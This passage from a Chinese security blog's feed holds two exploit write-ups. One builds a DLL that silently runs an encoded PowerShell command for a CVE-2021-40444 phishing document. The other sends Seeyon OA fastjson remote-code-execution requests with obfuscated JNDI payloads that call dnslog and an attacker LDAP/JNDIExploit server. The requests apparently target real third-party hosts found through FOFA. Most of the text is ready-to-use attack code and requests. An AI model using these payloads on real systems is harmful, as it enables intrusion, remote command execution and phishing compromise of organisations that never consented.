<p><img src="/../../../../images/%E5%BE%AE%E8%BD%AFMSHTML%E5%BC%95%E6%93%8ECVE-2021-40444%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210927121229111.png" alt="image-20210927121229111"></p>
<p>替换system字符中得内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &quot;pch.h&quot;</span><br><span class="line">#include &quot;windows.h&quot;</span><br><span class="line">#include &lt;cstdlib&gt;</span><br><span class="line"></span><br><span class="line">void exec(void) &#123;</span><br><span class="line">    system(&quot;powershell -nop -w hidden -encodedcommand xxxxx&quot;);</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL WINAPI DllMain(</span><br><span class="line">    HINSTANCE hinstDLL,</span><br><span class="line">    DWORD fdwReason,</span><br><span class="line">    LPVOID lpReserved)</span><br><span class="line">&#123;</span><br><span class="line">    switch (fdwReason)</span><br><span class="line">    &#123;</span><br><span class="line">    case DLL_PROCESS_ATTACH:</span><br><span class="line">        exec();</span><br><span class="line">        break;</span><br><span class="line"></span><br><span class="line">    case DLL_THREAD_ATTACH:</span><br><span class="line">        break;</span><br><span class="line"></span><br><span class="line">    case DLL_THREAD_DETACH:</span><br><span class="line">        break;</span><br><span class="line"></span><br><span class="line">    case DLL_PROCESS_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用vs2019生成dll，工具栏中 生成—生成解决方案</p>
<p><img src="/../../../../images/%E5%BE%AE%E8%BD%AFMSHTML%E5%BC%95%E6%93%8ECVE-2021-40444%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210927121505989.png" alt="image-20210927121505989"></p>
<p>把生成得Dll1.dll放在test目录下，然后像上面弹计算器一样生成对应得docx</p>
<p><img src="/../../../../images/%E5%BE%AE%E8%BD%AFMSHTML%E5%BC%95%E6%93%8ECVE-2021-40444%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210927121628503.png" alt="image-20210927121628503"></p>
<p><img src="/../../../../images/%E5%BE%AE%E8%BD%AFMSHTML%E5%BC%95%E6%93%8ECVE-2021-40444%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210927121912010.png" alt="image-20210927121912010"></p>
<p><img src="/../../../../images/%E5%BE%AE%E8%BD%AFMSHTML%E5%BC%95%E6%93%8ECVE-2021-40444%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210927121846219.png" alt="image-20210927121846219"></p>
<p>其实我感觉挺鸡肋得，因为已经被微软标记得妈都不认识了，不关闭实时访问也无法利用成功</p>
<p><img src="/../../../../images/%E5%BE%AE%E8%BD%AFMSHTML%E5%BC%95%E6%93%8ECVE-2021-40444%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210927122112426.png" alt="image-20210927122112426"></p>
]]></content>
      <tags>
        <tag>漏洞复现</tag>
        <tag>钓鱼</tag>
      </tags>
  </entry>
  <entry>
    <title>致远OA-fastjson-rce回显</title>
    <url>/2021/09/09/%E8%87%B4%E8%BF%9COA-fastjson-rce%E5%9B%9E%E6%98%BE/</url>
    <content><![CDATA[<h2 id="范围"><a href="#范围" class="headerlink" title="范围"></a>范围</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">V7.1、V7.1SP1</span><br><span class="line">V7.0、V7.0SP1、V7.0SP2、V7.0SP3</span><br><span class="line">V6.1、V6.1SP1、V6.1SP2</span><br><span class="line">V6.0、V6.0SP1</span><br><span class="line">V5.6、V5.6SP1</span><br></pre></td></tr></table></figure>

<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>第一种</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;seeyon&#x2F;main.do?method&#x3D;changeLocale HTTP&#x2F;1.1</span><br><span class="line">Host: 223.199.152.165:8088</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko&#x2F;20100101 Firefox&#x2F;47.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Cookie: JSESSIONID&#x3D;5CC67B9F2061656D0529AB3208F7CEA3</span><br><span class="line">X-Forwarded-For: 8.8.8.8</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">cmd: dir</span><br><span class="line">Content-Length: 694</span><br><span class="line"></span><br><span class="line">_json_params&#x3D;&#123;&quot;name&quot;:&#123;&quot;\u0040\u0074\u0079\u0070\u0065&quot;:&quot;\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0043\u006c\u0061\u0073\u0073&quot;,&quot;\u0076\u0061\u006c&quot;:&quot;\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&quot;&#125;,&quot;x&quot;:&#123;&quot;\u0040\u0074\u0079\u0070\u0065&quot;:&quot;\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&quot;,&quot;\u0064\u0061\u0074\u0061\u0053\u006f\u0075\u0072\u0063\u0065\u004e\u0061\u006d\u0065&quot;:&quot;ldap:&#x2F;&#x2F;t7hfci.dnslog.cn&quot;,&quot;autoCommit&quot;:true&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/%E8%87%B4%E8%BF%9COA-fastjson-rce%E5%9B%9E%E6%98%BE/image-20210909171916791.png" alt="image-20210909171916791"></p>
<p>第二种fofa上找了不少目标，感觉命中极少</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;seeyon&#x2F;sursenServlet HTTP&#x2F;1.1</span><br><span class="line">Host: oa.ydysj.com</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Length: 950</span><br><span class="line">cmd: whoami</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">sursenData&#x3D;%7B%22name%22%3A%7B%22%5Cu0040%5Cu0074%5Cu0079%5Cu0070%5Cu0065%22%3A%22%5Cu006a%5Cu0061%5Cu0076%5Cu0061%5Cu002e%5Cu006c%5Cu0061%5Cu006e%5Cu0067%5Cu002e%5Cu0043%5Cu006c%5Cu0061%5Cu0073%5Cu0073%22%2C%22%5Cu0076%5Cu0061%5Cu006c%22%3A%22%5Cu0063%5Cu006f%5Cu006d%5Cu002e%5Cu0073%5Cu0075%5Cu006e%5Cu002e%5Cu0072%5Cu006f%5Cu0077%5Cu0073%5Cu0065%5Cu0074%5Cu002e%5Cu004a%5Cu0064%5Cu0062%5Cu0063%5Cu0052%5Cu006f%5Cu0077%5Cu0053%5Cu0065%5Cu0074%5Cu0049%5Cu006d%5Cu0070%5Cu006c%22%7D%2C%22x%22%3A%7B%22%5Cu0040%5Cu0074%5Cu0079%5Cu0070%5Cu0065%22%3A%22%5Cu0063%5Cu006f%5Cu006d%5Cu002e%5Cu0073%5Cu0075%5Cu006e%5Cu002e%5Cu0072%5Cu006f%5Cu0077%5Cu0073%5Cu0065%5Cu0074%5Cu002e%5Cu004a%5Cu0064%5Cu0062%5Cu0063%5Cu0052%5Cu006f%5Cu0077%5Cu0053%5Cu0065%5Cu0074%5Cu0049%5Cu006d%5Cu0070%5Cu006c%22%2C%22%5Cu0064%5Cu0061%5Cu0074%5Cu0061%5Cu0053%5Cu006f%5Cu0075%5Cu0072%5Cu0063%5Cu0065%5Cu004e%5Cu0061%5Cu006d%5Cu0065&quot;:&quot;ldap:&#x2F;&#x2F;dwz227.dnslog.cn&quot;,&quot;autoCommit&quot;:true&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/%E8%87%B4%E8%BF%9COA-fastjson-rce%E5%9B%9E%E6%98%BE/image-20210909172138193.png" alt="image-20210909172138193"></p>
<h2 id="回显"><a href="#回显" class="headerlink" title="回显"></a>回显</h2><p>feihong-cs回显项目<a href="https://github.com/feihong-cs/JNDIExploit">https://github.com/feihong-cs/JNDIExploit</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar JNDIExploit-1.2-SNAPSHOT.jar -p 0909 -i 23.91.97.29</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;seeyon&#x2F;main.do?method&#x3D;changeLocale HTTP&#x2F;1.1</span><br><span class="line">Host: 223.199.152.165:8088</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko&#x2F;20100101 Firefox&#x2F;47.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Cookie: JSESSIONID&#x3D;5CC67B9F2061656D0529AB3208F7CEA3</span><br><span class="line">X-Forwarded-For: 8.8.8.8</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">cmd: whoami</span><br><span class="line">Content-Length: 711</span><br><span class="line"></span><br><span class="line">_json_params&#x3D;&#123;&quot;name&quot;:&#123;&quot;\u0040\u0074\u0079\u0070\u0065&quot;:&quot;\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0043\u006c\u0061\u0073\u0073&quot;,&quot;\u0076\u0061\u006c&quot;:&quot;\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&quot;&#125;,&quot;x&quot;:&#123;&quot;\u0040\u0074\u0079\u0070\u0065&quot;:&quot;\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&quot;,&quot;\u0064\u0061\u0074\u0061\u0053\u006f\u0075\u0072\u0063\u0065\u004e\u0061\u006d\u0065&quot;:&quot;ldap:&#x2F;&#x2F;23.91.97.29:1389&#x2F;Basic&#x2F;TomcatEcho&quot;,&quot;autoCommit&quot;:true&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/%E8%87%B4%E8%BF%9COA-fastjson-rce%E5%9B%9E%E6%98%BE/image-20210909172446201.png" alt="image-20210909172446201"></p>
]]></content>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
</search>
